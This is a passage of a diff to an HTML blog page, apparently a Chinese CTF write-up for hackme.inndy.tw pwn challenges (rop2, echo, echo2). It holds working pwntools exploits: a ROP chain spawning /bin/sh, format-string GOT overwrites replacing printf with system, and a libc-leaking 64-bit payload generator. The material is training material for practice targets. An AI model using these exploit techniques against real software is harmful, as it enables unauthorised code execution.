+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7703</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./rop2&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ex</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pwnlib.gdb.attach(io)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># raw_input()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;some_buffer&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;overflow&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xC</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">),</span> <span class="n">syscall_addr</span><span class="p">,</span> <span class="n">overflow_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">SYS_read</span><span class="p">,</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">7</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xC</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">),</span> <span class="n">syscall_addr</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">SYS_execve</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="toooomuch">toooomuch</h2>
 <blockquote>
@@ -944,14 +944,14 @@ Tips: format string vulnerability</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">▶ checksec echo
-[*] &#39;/home/aloxaf/CTF/echo&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">▶ checksec echo
+</span></span><span class="line"><span class="cl">[*] &#39;/home/aloxaf/CTF/echo&#39;
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>程序非常简单, 就是读入一个字符串然后用 printf 输出. 非常明显的格式化字符串漏洞.
 并且有 system 函数可以利用.</p>
@@ -976,24 +976,24 @@ Tips: format string vulnerability</p>
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-10Ch]
-</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+10Ch] [ebp-Ch]
-</span><span class="c1"></span>
-  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-  <span class="k">do</span>
-  <span class="p">{</span>
-    <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="k">while</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;exit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)</span> <span class="p">);</span>
-  <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo Goodbye&#34;</span><span class="p">);</span>
-  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-10Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+10Ch] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;exit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo Goodbye&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1024,32 +1024,32 @@ Tips: format string vulnerability</p>
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
-
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
-<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
-<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./echo&#39;</span><span class="p">)</span>
-<span class="c1"># io = remote(&#39;hackme.inndy.tw&#39;, 7711)</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./echo&#39;</span><span class="p">)</span>
-
-<span class="c1"># 没有开ASLR, 可以直接从 elf 中读取 plt </span>
-<span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
-<span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_plt: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_plt</span><span class="p">))</span>
-
-<span class="c1"># pwnlib.gdb.attach(io)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_plt</span><span class="p">})</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;payload: &#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./echo&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io = remote(&#39;hackme.inndy.tw&#39;, 7711)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./echo&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 没有开ASLR, 可以直接从 elf 中读取 plt </span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_plt: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_plt</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># pwnlib.gdb.attach(io)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_plt</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;payload: &#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>第一次做出格式化字符串的题, 看了半天CTF wiki, 终于明白原理了.</p>
 <p>利用格式化字符串可以做到任意地址读写, 基本思路是先泄露 system 地址.
@@ -1075,14 +1075,14 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">▶ checksec echo2
-[*] &#39;/home/aloxaf/CTF/echo2&#39;
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">▶ checksec echo2
+</span></span><span class="line"><span class="cl">[*] &#39;/home/aloxaf/CTF/echo2&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>和上一题主要有两个不同, 一个是64位, 另一个是开启了ASLR</p>
 <p>先执行一下, 输入 <code>AAAAAAAA%p%p%p%p%p%p%p%p </code> 根据结果 <code>AAAAAAAA0x7fa5b1b827300x7fff524033000xfbad208b0x7fa5b1b815c00x7fa5b1b827200x4141 4141414141410x70257025702570250x7025702570257025 </code> 可以判断出偏移是6.</p>
@@ -1153,68 +1153,68 @@ Tips: ASLR enabled</p>
 </span><span class="lnt">61
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
-
-<span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-
-<span class="c1"># io = process(&#39;./echo2&#39;, env={&#34;LD_PRELOAD&#34;: &#34;./libc-2.23.so.x86_64&#34;})</span>
-<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7712</span><span class="p">)</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./echo2&#39;</span><span class="p">)</span>
-
-<span class="c1"># pwnlib.gdb.attach(io, &#39;b printf&#39;)</span>
-
-<span class="c1"># 泄露 main 函数基址, __libc_start_main 基址</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%41$p %43$p&#39;</span><span class="p">)</span>
-<span class="n">main_addr</span><span class="p">,</span> <span class="n">libc_addr</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
-<span class="n">main_addr</span> <span class="o">-=</span> <span class="mi">74</span>
-<span class="n">libc_addr</span> <span class="o">-=</span> <span class="mi">240</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;main_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
-
-<span class="c1"># 得到 libc 基址</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">)</span>
-<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-
-<span class="c1"># 得到 elf 基址</span>
-<span class="n">elf_offset</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
-<span class="c1"># 得到 printf_got 地址</span>
-<span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf_offset</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;printf_got: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
-<span class="c1"># 得到 system 地址</span>
-<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;system_addr: </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
-
-<span class="c1"># 64位没法使用 fmtstr_payload, 因为默认把地址放在前面会导致大概率被 \x00 截断</span>
-<span class="k">def</span> <span class="nf">fmt_str_payload64</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
-    <span class="s2">&#34;&#34;&#34;
-</span><span class="s2">    生成 64 位格式化字符串payload
-</span><span class="s2">    offset: 偏移
-</span><span class="s2">    src: 源地址
-</span><span class="s2">    data: 欲写入内容
-</span><span class="s2">    &#34;&#34;&#34;</span>
-    <span class="n">payload1</span><span class="p">,</span> <span class="n">payload2</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>
-    <span class="n">addr</span> <span class="o">=</span> <span class="p">[[</span><span class="nb">ord</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">data</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])]</span> <span class="c1"># 最后两位一般是 \x00</span>
-    <span class="n">addr</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
-    <span class="n">chr_cnt</span> <span class="o">=</span> <span class="mi">0</span>
-    <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
-        <span class="n">payload1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;%</span><span class="si">{:02}</span><span class="s1">c%</span><span class="si">{}</span><span class="s1">$hhn&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-</span><span class="n">chr_cnt</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="n">index</span><span class="p">))</span>
-        <span class="n">payload2</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">src</span><span class="o">+</span><span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-        <span class="n">chr_cnt</span> <span class="o">=</span> <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-
-    <span class="c1"># 用 &#39;_&#39; 对齐</span>
-    <span class="k">return</span> <span class="n">flat</span><span class="p">(</span><span class="n">payload1</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;_&#39;</span> <span class="o">*</span> <span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">payload2</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="n">fmt_str_payload64</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">printf_got</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./echo2&#39;, env={&#34;LD_PRELOAD&#34;: &#34;./libc-2.23.so.x86_64&#34;})</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7712</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./echo2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># pwnlib.gdb.attach(io, &#39;b printf&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 泄露 main 函数基址, __libc_start_main 基址</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%41$p %43$p&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span><span class="p">,</span> <span class="n">libc_addr</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">-=</span> <span class="mi">74</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_addr</span> <span class="o">-=</span> <span class="mi">240</span>
